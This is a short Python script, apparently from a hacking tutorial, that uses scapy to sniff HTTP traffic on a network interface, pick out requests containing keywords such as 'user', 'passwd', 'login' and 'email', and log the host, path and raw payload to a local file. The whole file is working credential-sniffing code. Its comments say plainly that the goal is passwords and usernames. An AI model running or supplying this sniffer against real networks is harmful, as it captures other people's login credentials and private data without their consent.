#!/usr/bin/env python3
# if you're throwing a scapy has no http use python not python3

import scapy.all as scapy
from scapy.layers import http
import sys
import datetime


# from scapy.layers.http import *
interface = sys.argv[1]

def print_packet(packet):
    # packets captured show all data, it needs to be filtered
    # we capture all the data on our iface so filter it by protocol or port, whats your goal?
    # passwords, searches and usernames = port 80 (filter HTTP) --> pip install scapy_http
    # extract useful data
    # note this script works on HTTP not HTTPS
#    print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
#            print(packet.show())

#            print(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)

            # for whatever layer you want layer goes in brackets, then .fieldname
            packet_load = str(packet[scapy.Raw].load)
#            print(packet_load)
            keywords = ["usr", "user", "passwd", "login", "login id", "username", "pwd", "password", "email", "email id"]
            with open("./output.txt", 'a') as outfile:

                for keyword in keywords:
                    if keyword in packet_load:
                        outfile.write("\n\n*******************************\n")
                        request = (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
                        request = request.decode()
                        outfile.write(request)
                        outfile.write(packet_load)
                        outfile.write("\n*******************************\n\n")
                        break


def packet_sniffer(interface):

    # prn argument allows callback function to let us know a packet was captured and execute a given function
    # set store to false because receiving a ton of data causing an overload
    # we capture all the data on our iface so filter it by protocol or port, whats your goal?
    # passwords, searches and usernames = port 80 (filter HTTP) --> pip install scapy_http
    scapy.sniff(iface=interface, store=False, prn=print_packet)



packet_sniffer(interface)
